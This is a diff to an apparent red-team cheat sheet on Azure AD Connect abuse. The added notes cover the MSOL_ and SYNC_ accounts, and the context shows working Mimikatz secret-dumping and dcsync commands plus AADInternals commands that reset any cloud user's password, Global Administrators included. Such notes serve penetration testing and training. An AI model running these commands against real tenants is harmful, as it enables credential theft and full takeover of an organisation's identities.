@@ -9,7 +9,7 @@
 * [Application proxy abuse](#Application-proxy-abuse)
 
 ## On-Prem --> Azure AD
-* [Hybrid Identity](#Hybrid-Identity)
+* [Azure AD Connect](#Azure-AD-Connect)
   * [Password Hash Sync (PHS) Abuse](#Password-Hash-Sync-(PHS)-Abuse)
   * [Pass Through Authentication (PTA) Abuse](#Pass-Through-Authentication-(PTA)-Abuse)
   * [Federation (ADFS)](#Federation-(ADFS))
@@ -124,9 +124,12 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
 ```
 
 # On-Prem --> Azure AD
-## Hybrid Identity
+## Azure AD Connect
+- Check if there is an account name with `MSOL_<INSTALLATION ID>`. This user has DCSYNC rights. (or `AAD_` if installed on a DC)
+- Command to check if AD connect is installed on the server `Get-ADSyncConnector`
+
 ## Password Hash Sync (PHS) Abuse
-- Check if there is an account name with MSOL_<INSTALLATION ID>. This user has DCSYNC rights.
+- Account with `SYNC_` is created in Azure AD and can reset any users password in Azure AD.
 - Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.
 
 #### Enumerate server where Azure AD is installed (on prem command)
@@ -154,7 +157,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync/user:defeng\krbtgt /domain:defeng.cor
 ### Reset password of any user
 - Using the Sync_* account we can reset password for any user. (Including Global Administrator and the user who created the tenant)
 
-#### Using the creds, request an access token for AADGraph and save it to cache
+#### Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.
 ```
 $passwd = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("Sync_DEFENG-ADCNCT_782bef6aa0a9@defcorpsecure.onmicrosoft.com", $passwd)
@@ -182,6 +185,8 @@ Set-AADIntUserPassword -SourceAnchor "E2gG19HA4EaDe0+3LkcS5g==" -Password "Super
 Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
 Set-AADIntUserPassword -CloudAnchor "User_10caa362-7d18-48c9-a45b-9c3a78f3a96b" -Password "SuperSecretpass#12321" -Verbose
 ```
+
+- Access Azure portal using the new password.
 
 ## Pass Through Authentication (PTA) Abuse
 - Once we have admin access to an Azure AD connect server running PTA agent.
